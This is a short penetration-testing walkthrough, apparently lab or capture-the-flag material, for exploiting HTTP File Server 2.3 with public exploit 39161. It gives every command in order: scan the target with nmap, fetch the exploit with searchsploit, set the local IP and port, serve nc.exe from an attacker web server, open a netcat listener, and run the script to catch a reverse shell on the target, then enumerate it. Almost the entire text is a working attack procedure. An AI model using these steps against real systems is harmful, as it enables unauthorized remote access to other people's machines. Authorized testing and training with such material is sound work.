Use Searchsploit to find public exploits and modify them as needed to ensure they work in your target environment.

```shell
nmap -sV <target_IP> 
# Scan for open ports and detect services

searchsploit HTTP File Server 2.3
# Search for known exploits in Exploit-DB

searchsploit -m 39161
# Copy exploit 39161 to the current directory

vim 39161.py
# This exploit requires you to change the local IP and local port values
# ip_addr
# local_port

cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/  
# Prepare Netcat binary to be served

cd /root/Desktop
# Go to the directory where the server will run

python -m SimpleHTTPServer 80
# Terminal 1
# Start a web server to host nc.exe

nc -nvlp <your_port>
# Terminal 2
# Open a Netcat listener to catch the shell

python 39161.py <target_ip> 80
# Terminal 3
# Run the exploit against the vulnerable target

# If the exploit script runs successfully, we should receive a reverse shell on our Netcat listener
whoami 
# Check current user on the remote system

systeminfo
# Display system information from the target
```
